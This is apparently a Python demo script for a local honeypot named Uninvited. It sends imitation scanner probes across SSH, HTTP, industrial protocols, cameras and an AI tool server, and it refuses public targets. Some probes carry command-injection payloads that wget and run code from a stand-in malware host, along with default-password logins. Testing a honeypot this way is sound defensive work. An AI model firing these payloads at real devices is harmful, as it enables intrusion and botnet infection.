#!/usr/bin/env python3
"""Knock on every decoy of a local Uninvited, so the dashboard has something to show.

    python -m uninvited --demo      # in one terminal (it knocks once by itself)
    python -m uninvited --knock     # in another, to knock again: it runs this file

Each probe is a small, harmless imitation of something a real scanner or botnet sends: a failed
login, a request for a leaked .env file, a Modbus read, an S7 identification request, an AI-tool
listing. They are made up for the demo and use reserved example names, so nothing here points at
anyone's real infrastructure.

This only talks to the machine you name, and by default only to this one. It refuses to aim at an
address that is not loopback or private, because the honest use of a honeypot is to be the target,
never to attack someone else's.
"""
from __future__ import annotations

import argparse
import ipaddress
import socket
import sys
import time

# The ports in config.quickstart.yaml.
PORTS = {"sip": 5060, "ssh": 2222, "telnet": 2323, "ftp": 2121, "http": 8081, "smtp": 2525, "rdp": 33890, "smb": 4445,
         "modbus": 5020, "s7": 5102, "enip": 44818, "dnp3": 20001, "cam": 8083, "rtsp": 8554,
         "router": 8084, "tr069": 7547, "mcp": 8085}


def talk(host: str, port: int, steps: list[bytes], wait: float = 0.4, drain: bool = False) -> list[bytes]:
    """Send each step, collect what comes back after each, then hang up. With drain, wait once
    more at the end for a slow answer (the Telnet decoy makes a guesser wait a second)."""
    out = []
    with socket.create_connection((host, port), timeout=4) as s:
        s.settimeout(wait)
        try:
            out.append(s.recv(2048))                      # a banner, if the service sends one
        except TimeoutError:
            out.append(b"")
        for step in steps:
            s.sendall(step)
            try:
                out.append(s.recv(4096))
            except TimeoutError:
                out.append(b"")
        if drain:
            try:
                out.append(s.recv(4096))
            except TimeoutError:
                out.append(b"")
    return out


def http(host: str, port: int, method: str, path: str, body: bytes = b"", headers: str = "") -> bytes:
    req = (f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: try-it/1.0\r\n{headers}"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode() + body
    return talk(host, port, [req], 0.6)[1]


def probe_ssh(host):
    try:
        import paramiko
    except ImportError:
        return "skipped (pip install paramiko)"
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, PORTS["ssh"], username="root", password="admin123", timeout=5,
                       allow_agent=False, look_for_keys=False)
        return "logged in?! this should never happen"
    except paramiko.AuthenticationException:
        return "login refused, as designed"
    finally:
        client.close()


def probe_telnet(host):
    got = talk(host, PORTS["telnet"], [b"root\r\n", b"123456\r\n"], 1.4, drain=True)
    return "login refused, as designed" if b"incorrect" in b"".join(got).lower() else "answered"


def probe_ftp(host):
    got = talk(host, PORTS["ftp"], [b"USER anonymous\r\n", b"PASS guest@example.org\r\n"], 1.4)
    return got[-1].decode("latin-1").strip()[:50]


def probe_smtp(host):
    got = talk(host, PORTS["smtp"], [b"EHLO try-it\r\n", b"MAIL FROM:<a@example.org>\r\n",
                                     b"RCPT TO:<victim@example.net>\r\n"])
    return got[-1].decode("latin-1").strip()[:50]


def probe_http(host):
    paths = ["/.env", "/wp-login.php", "/geoserver/web/", "/ignite?cmd=version"]
    codes = [http(host, PORTS["http"], "GET", p).split(b"\r\n", 1)[0].decode("latin-1") for p in paths]
    dropper = http(host, PORTS["http"], "GET",
                   "/board.cgi?cmd=cd+/tmp;wget+http://malware.example.net/Mozi.a;chmod+777+Mozi.a")
    codes.append(dropper.split(b"\r\n", 1)[0].decode("latin-1"))
    return f"{len(paths)} probes and a download command, every one answered {sorted(set(codes))}"


def probe_sip(host):
    invite = (b"INVITE sip:0044123456789@example.org SIP/2.0\r\nFrom: <sip:100@example.net>\r\n"
              b"To: <sip:0044123456789@example.org>\r\nCSeq: 1 INVITE\r\nContent-Length: 0\r\n\r\n")
    got = talk(host, PORTS["sip"], [invite])
    return got[1].split(b"\r\n", 1)[0].decode("latin-1")


def probe_rdp(host):
    cookie = b"Cookie: mstshash=quickstart\r\n"
    got = talk(host, PORTS["rdp"], [b"\x03\x00\x00" + bytes([11 + len(cookie)]) + b"\x06\xe0\x00\x00\x00\x00\x00" + cookie])
    return f"{len(got[-1])} byte reply"


def probe_smb(host):
    got = talk(host, PORTS["smb"], [b"\x00\x00\x00\x2f\xffSMBr\x00\x00\x00\x00\x18\x53\xc8" + bytes(36)])
    return f"{len(got[-1])} byte reply"


def probe_modbus(host):
    read = bytes.fromhex("000100000006010300000002")                 # read two holding registers
    ident = bytes.fromhex("000200000005012b0e0100")                  # read device identification
    got = talk(host, PORTS["modbus"], [read, ident])
    return f"answered {len(got[1])} and {len(got[2])} bytes"


def probe_s7(host):
    cr = bytes.fromhex("0300001611e00000000100c0010ac1020100c2020102")
    setup = bytes.fromhex("0300001902f08032010000000100080000f0000001000101e0")           # negotiate the PDU size
    szl = bytes.fromhex("0300002102f0803207000000040008000800011204114401000a00000400110000")   # read the identity list
    got = talk(host, PORTS["s7"], [cr, setup, szl])
    return f"connected, negotiated, read the module identity ({len(got[3])} bytes)"


def probe_enip(host):
    got = talk(host, PORTS["enip"], [bytes.fromhex("630000000000000000000000000000000000000000000000")])
    return f"ListIdentity answered {len(got[1])} bytes"


def probe_dnp3(host):
    got = talk(host, PORTS["dnp3"], [bytes.fromhex("056405c9010002003b95")])           # link status request
    return f"link status answered {len(got[1])} bytes"


def probe_cam(host):
    a = http(host, PORTS["cam"], "GET", "/doc/page/login.asp")
    b = http(host, PORTS["cam"], "PUT", "/SDK/webLanguage", b"<language>$(wget http://malware.example.net/x -O- | sh)</language>")
    return f"login page {a.split(b' ', 2)[1].decode()}, camera exploit {b.split(b' ', 2)[1].decode()}"


def probe_rtsp(host):
    got = talk(host, PORTS["rtsp"], [b"OPTIONS rtsp://x/ RTSP/1.0\r\nCSeq: 1\r\n\r\n"])
    return got[1].split(b"\r\n", 1)[0].decode("latin-1")


def probe_router(host):
    got = http(host, PORTS["router"], "GET", "/HNAP1/")
    return got.split(b"\r\n", 1)[0].decode("latin-1")


def probe_tr069(host):
    got = http(host, PORTS["tr069"], "POST", "/UD/act?1", b"<SOAP-ENV:Envelope/>")
    return got.split(b"\r\n", 1)[0].decode("latin-1")


def probe_mcp(host):
    j = b'{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}'
    c = b'{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"run_command","arguments":{"command":"id"}}}'
    a = http(host, PORTS["mcp"], "POST", "/mcp", j, "Content-Type: application/json\r\n")
    b = http(host, PORTS["mcp"], "POST", "/mcp", c, "Content-Type: application/json\r\n")
    return "tool list read, run_command refused" if b"run_command" in a and b"denied" in b.lower() else "answered"


PROBES = [("SSH", probe_ssh), ("Telnet", probe_telnet), ("FTP", probe_ftp), ("SMTP", probe_smtp),
          ("HTTP", probe_http), ("RDP", probe_rdp), ("SMB", probe_smb), ("SIP", probe_sip), ("Modbus", probe_modbus),
          ("S7", probe_s7), ("EtherNet/IP", probe_enip), ("DNP3", probe_dnp3), ("Camera", probe_cam),
          ("RTSP", probe_rtsp), ("Router", probe_router), ("TR-069", probe_tr069), ("AI tool server", probe_mcp)]


def knock(host: str, say=print) -> int:
    """Run every probe once against host and say what each decoy answered. -> how many answered."""
    answered = 0
    for name, fn in PROBES:
        try:
            result = fn(host)
            answered += 1
            say(f"  {name:15} {result}")
        except OSError as exc:
            say(f"  {name:15} not reachable ({exc.strerror or exc}). Is the demo running (uninvited --demo)?")
        time.sleep(0.05)
    return answered


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n\n")[0])
    ap.add_argument("--host", default="127.0.0.1", help="the machine running Uninvited (default: this one)")
    args = ap.parse_args(argv)
    try:
        addr = ipaddress.ip_address(socket.gethostbyname(args.host))
    except (OSError, ValueError):
        print(f"cannot resolve {args.host}")
        return 2
    if not (addr.is_loopback or addr.is_private):
        print(f"{args.host} is a public address. This tool only knocks on your own machine.")
        return 2

    print(f"Knocking on every decoy at {args.host}\n")
    answered = knock(args.host)
    print(f"\n{answered} of {len(PROBES)} decoys answered. Open http://{args.host}:8090/ to see them.")
    return 0 if answered else 1


if __name__ == "__main__":
    sys.exit(main())
